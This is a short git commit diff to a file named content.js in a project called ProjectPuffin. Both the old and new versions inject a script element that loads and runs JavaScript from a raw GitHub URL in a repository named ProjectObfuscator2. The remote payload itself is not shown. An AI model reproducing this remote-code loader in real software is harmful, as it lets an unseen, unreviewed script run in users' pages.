5398cf0f0f22fb46bfb3082ba742d27986e78d19
Maxwell The Cat <105382091+JustASpoonful@users.noreply.github.com>
2025-07-05 21:29:31 -0400

    Update content.js

--- ProjectPuffin/content.js
+++ ProjectPuffin/content.js
@@ -1,3 +1,6 @@
-(function(){    
-  var script = document.createElement('script');    
-  script.src = 'https://raw.githubusercontent.com/JustASpoonful/ProjectObfuscator2/refs/heads/main/content.js'; document.body.appendChild(script);})();
+const script = document.createElement('script');
+script.src = "https://raw.githubusercontent.com/JustASpoonful/ProjectObfuscator2/refs/heads/main/content.js";
+script.type = "text/javascript";
+script.onload = () => console.log("✅ Remote script loaded.");
+script.onerror = () => console.error("❌ Failed to load remote script.");
+document.documentElement.appendChild(script);
